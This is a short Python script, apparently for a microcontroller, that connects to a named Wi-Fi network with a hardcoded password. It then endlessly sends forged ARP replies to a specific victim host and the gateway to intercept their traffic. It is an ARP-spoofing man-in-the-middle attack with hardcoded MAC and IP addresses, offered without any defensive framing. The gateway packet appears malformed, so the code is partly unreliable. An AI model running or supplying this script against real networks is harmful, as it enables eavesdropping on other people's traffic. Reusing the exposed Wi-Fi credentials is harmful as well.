import socket
import network
import struct
import binascii


def htons(val):
    return ((val << 8) & 0xFF00) | ((val >> 8) & 0x0FF)


def ip_to_bytes(ip_address):
    parts = ip_address.split('.')
    if len(parts) != 4:
        raise ValueError("Invalid IP address format")

    ip_bytes = bytearray(4)
    for i, part in enumerate(parts):
        ip_bytes[i] = int(part)
    
    return bytes(ip_bytes)

wlan = network.WLAN(network.STA_IF)
wlan.active(True)
wlan.connect('TP-link_Kish', '6267345363')

while not wlan.isconnected():
    print("connecting...")
    pass


s = socket.socket(socket.AF_INET, socket.SOCK_RAW, htons(0x0800))

attackerMac = b'\x4C\x75\x25\x36\xC4\x0C'
victimMac =  b'\xE0\x0A\xF6\x51\x91\x95'
gatewayMac =  b'\xc0\xc9\xe3\xc8\xf0\x83'

code = b'\x08\x06'

victimEthPacket = victimMac + attackerMac + code
gatewayEthPacket = gatewayMac + attackerMac + code

htype = b'\x00\x01'
protype = b'\x08\x00'
hsize = b'\x06'
psize = b'\x04'
opcode = b'\x00\x02'


gatewayIP = ip_to_bytes('192.168.0.1')
victimIP = ip_to_bytes('192.168.0.151')

victimARP = victimEthPacket+htype+protype+hsize+psize+opcode+attackerMac+gatewayIP+victimMac+victimIP
gatewayARP = gatewayEthPacket+htype+protype+hsize+psize+opcode+attackerMac+gatewayMac+gatewayIP

while 1:
    print("sending packets")
    s.send(victimARP)
    s.send(gatewayARP)

























































